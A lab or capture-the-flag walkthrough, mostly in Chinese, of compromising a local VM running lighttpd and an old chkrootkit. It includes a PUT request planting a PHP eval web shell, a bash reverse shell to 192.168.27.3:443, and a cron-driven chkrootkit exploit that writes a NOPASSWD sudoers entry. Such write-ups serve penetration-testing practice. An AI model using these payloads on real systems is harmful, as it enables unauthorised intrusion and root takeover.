### Port Scan

```bash
# Nmap 7.94SVN scan initiated Sat Nov  9 09:41:09 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.27.5
Nmap scan report for 192.168.27.5
Host is up (0.00084s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:75:44:54 (VMware)
```

```bash
# Nmap 7.94SVN scan initiated Sat Nov  9 09:43:06 2024 as: nmap -sT -sV -sC -O -p22,80 -oN nmap_results/detils_scan 192.168.27.5
Nmap scan report for 192.168.27.5
Host is up (0.00084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: lighttpd/1.4.28
MAC Address: 00:0C:29:75:44:54 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (89%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%), Linux 4.10 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
nmap --script=vuln -p80 -oN nmap_results/script_scan 192.168.27.5
```

```bash
nikto -h http://192.168.27.5
```

![image-20241110141501506](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241110141501506.png)

有个`test`目录

### Web

test目录下支持`put`方法

```http
PUT /test/shell.php HTTP/1.1
Host: 192.168.27.5
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

<?php eval($_POST[1]);
```

```bash
/bin/bash -i >& /dev/tcp/192.168.27.3/443 0>&1
```

端口443可以接收到shell

### Privilege Escalation

```bash
www-data@ubuntu:/tmp$ ls -lah /etc/cron*
ls -lah /etc/cron*
-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab

ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72K
drwxr-xr-x  2 root root 4.0K Apr 12  2016 .
drwxr-xr-x 84 root root 4.0K Nov  9 15:53 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  16K Nov 15  2013 apt
-rwxr-xr-x  1 root root  314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root  502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root 2.0K Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root  256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root  338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root  372 Oct  4  2011 logrotate
```

定时任务中，有`chkrootkit`

```bash
www-data@ubuntu:/tmp$ chkrootkit -V
chkrootkit -V
chkrootkit version 0.49
```

![image-20241110142942537](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241110142942537.png)

有一个提权漏洞

> 在/tmp目录下，创建一个update文件，作为定时任务的chkrootkit会运行update文件（以root身份）
>
> 将sudo权限给www-data即可

```bash
www-data@ubuntu:/tmp$ echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers' > update
 updatecho "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers' > 
www-data@ubuntu:/tmp$ cat update
cat update
echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers
```

然后`sudo bash`拿到root